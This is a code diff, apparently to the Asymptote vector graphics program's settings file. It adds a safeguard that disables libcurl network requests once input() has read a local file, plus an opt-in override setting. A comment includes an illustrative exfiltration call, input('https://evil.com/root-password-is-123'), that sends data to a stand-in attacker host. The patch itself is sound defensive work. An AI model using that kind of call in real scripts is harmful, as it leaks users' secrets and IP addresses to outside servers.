@@ -346,9 +346,22 @@ bool safe=true;
 bool globalRead=true;
 // Enable writing to (or changing to) other directories
 bool globalWrite=false;
+// Flag set when input() reads any file
+bool haveReadFile=false;
+// Set true only if -curlAfterRead was explicitly given on the command line
+bool curlOverride=false;
 
 bool globalwrite() {return globalWrite || !safe;}
 bool globalread() {return globalRead || !safe;}
+
+#ifdef HAVE_LIBCURL
+// Blocking libcurl prevents DNS/log leakage: even a failed URL request
+// (e.g., input("https://evil.com/root-password-is-123")) exposes the URL
+// path and the user's IP address in the remote server's logs.
+bool curlEnabled() {return curlOverride || !haveReadFile;}
+#else
+bool curlEnabled() {return false;}
+#endif
 
 const string suffix="asy";
 const string guisuffix="gui";
@@ -1649,8 +1662,8 @@ void initSettings() {
   addOption(new stringSetting("imageDir", 0,"str","Environment image library directory","ibl"));
   addOption(new stringSetting("imageURL", 0,"str","Environment image library URL","https://vectorgraphics.gitlab.io/asymptote/ibl"));
   addOption(new realSetting("render", 0, "n",
-                            "Render 3D graphics using n pixels per bp (-1=auto)",
-                            havegl ? -1.0 : 0.0));
+                            "Render 3D graphics using n pixels per bp",
+                            havegl ? 2.0 : 0.0));
   addOption(new realSetting("devicepixelratio", 0, "n", "Ratio of physical to logical pixels", 0.0));
   addOption(new IntSetting("antialias", 0, "n",
                            "Antialiasing width for rasterized output", 2));
@@ -1792,6 +1805,9 @@ void initSettings() {
   addSecureSetting(new boolrefSetting("globalread", 0,
                                       "Allow read from other directory",
                                       &globalRead, true));
+  addSecureSetting(new boolrefSetting("curlAfterRead", 0,
+                                      "Allow libcurl after reading local files via input()",
+                                      &curlOverride, false));
   addSecureSetting(new stringSetting("outname", 'o', "name",
                                      "Alternative output directory/file prefix"));
   addOption(new stringOption("cd", 0, "directory", "Set current directory",
